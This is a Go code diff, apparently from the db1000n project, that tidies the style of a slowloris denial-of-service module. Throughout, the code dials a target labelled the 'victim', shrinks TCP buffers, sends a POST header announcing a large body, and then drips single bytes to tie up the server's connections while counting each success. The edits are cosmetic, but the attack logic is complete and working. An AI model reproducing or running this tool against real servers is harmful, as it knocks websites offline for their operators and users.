@@ -10,9 +10,9 @@ import (
 	"strings"
 	"time"
 
-	"github.com/Arriven/db1000n/src/utils/metrics"
-
 	utls "github.com/refraction-networking/utls"
+
+	"github.com/Arriven/db1000n/src/utils/metrics"
 )
 
 // Config holds all the configuration values for slowloris
@@ -31,8 +31,10 @@ type SlowLoris struct {
 	Config *Config
 }
 
+const sharedReadBufSize = 4096
+
 var (
-	sharedReadBuf  = make([]byte, 4096)
+	sharedReadBuf  = make([]byte, sharedReadBufSize)
 	sharedWriteBuf = []byte("A")
 )
 
@@ -45,6 +47,7 @@ func Start(stopChan chan bool, config *Config) error {
 	targetURL, err := url.Parse(config.Path)
 	if err != nil {
 		log.Printf("Cannot parse Path=[%s]: %v", targetURL, err)
+
 		return err
 	}
 
@@ -54,22 +57,27 @@ func Start(stopChan chan bool, config *Config) error {
 		if targetURL.Scheme == "https" {
 			port = "443"
 		}
+
 		targetHostPort = net.JoinHostPort(targetHostPort, port)
 	}
+
 	host := targetURL.Host
 	if len(config.HostHeader) > 0 {
 		host = config.HostHeader
 	}
+
 	requestHeader := []byte(fmt.Sprintf("POST %s HTTP/1.1\nHost: %s\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\n\n",
 		targetURL.RequestURI(), host, config.ContentLength))
-
 	dialWorkersLaunchInterval := config.RampUpInterval / time.Duration(config.DialWorkersCount)
 	activeConnectionsCh := make(chan int, config.DialWorkersCount)
+
 	go s.activeConnectionsCounter(activeConnectionsCh)
+
 	for i := 0; i < config.DialWorkersCount; i++ {
 		go s.dialWorker(stopChan, config, activeConnectionsCh, targetHostPort, targetURL, requestHeader)
 		time.Sleep(dialWorkersLaunchInterval)
 	}
+
 	time.Sleep(config.Duration)
 
 	return nil
@@ -77,14 +85,15 @@ func Start(stopChan chan bool, config *Config) error {
 
 func (s SlowLoris) dialWorker(stopChan chan bool, config *Config, activeConnectionsCh chan<- int, targetHostPort string, targetURI *url.URL, requestHeader []byte) {
 	isTLS := targetURI.Scheme == "https"
+
 	for {
 		select {
 		case <-stopChan:
 			return
 		default:
 			time.Sleep(config.RampUpInterval)
-			conn := s.dialVictim(targetHostPort, isTLS)
-			if conn != nil {
+
+			if conn := s.dialVictim(targetHostPort, isTLS); conn != nil {
 				go s.doLoris(config, targetHostPort, conn, activeConnectionsCh, requestHeader)
 			}
 		}
@@ -105,25 +114,36 @@ func (s SlowLoris) dialVictim(hostPort string, isTLS bool) io.ReadWriteCloser {
 	if err != nil {
 		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
 		log.Printf("Couldn't establish connection to [%s]: %v", hostPort, err)
+
 		return nil
 	}
 
-	tcpConn := conn.(*net.TCPConn)
-	if err = tcpConn.SetReadBuffer(128); err != nil {
+	tcpConn, ok := conn.(*net.TCPConn)
+	if !ok {
+		// This should never happen
+		return nil
+	}
+
+	const bufferSize = 128
+
+	if err = tcpConn.SetReadBuffer(bufferSize); err != nil {
 		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
 		log.Printf("Cannot shrink TCP read buffer: %v", err)
+
 		return nil
 	}
 
-	if err = tcpConn.SetWriteBuffer(128); err != nil {
+	if err = tcpConn.SetWriteBuffer(bufferSize); err != nil {
 		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
 		log.Printf("Cannot shrink TCP write buffer: %v", err)
+
 		return nil
 	}
 
 	if err = tcpConn.SetLinger(0); err != nil {
 		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
 		log.Printf("Cannot disable TCP lingering: %v", err)
+
 		return nil
 	}
 
@@ -139,6 +159,7 @@ func (s SlowLoris) dialVictim(hostPort string, isTLS bool) io.ReadWriteCloser {
 		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
 		conn.Close()
 		log.Printf("Couldn't establish tls connection to [%s]: %v", hostPort, err)
+
 		return nil
 	}
 
@@ -151,6 +172,7 @@ func (s SlowLoris) doLoris(config *Config, destinationHostPort string, conn io.R
 	if _, err := conn.Write(requestHeader); err != nil {
 		metrics.IncSlowLoris(destinationHostPort, "tcp", metrics.StatusFail)
 		log.Printf("Cannot write requestHeader=[%v]: %v", requestHeader, err)
+
 		return
 	}
 
@@ -166,17 +188,21 @@ func (s SlowLoris) doLoris(config *Config, destinationHostPort string, conn io.R
 			return
 		case <-time.After(config.SleepInterval):
 		}
+
 		if _, err := conn.Write(sharedWriteBuf); err != nil {
 			metrics.IncSlowLoris(destinationHostPort, "tcp", metrics.StatusFail)
 			log.Printf("Error when writing %d byte out of %d bytes: %v", i, config.ContentLength, err)
+
 			return
 		}
+
 		metrics.IncSlowLoris(destinationHostPort, "tcp", metrics.StatusSuccess)
 	}
 }
 
 func (s SlowLoris) nullReader(conn io.Reader, ch chan<- int) {
 	defer func() { ch <- 1 }()
+
 	n, err := conn.Read(sharedReadBuf)
 	if err != nil {
 		log.Printf("Error when reading server response: %v", err)
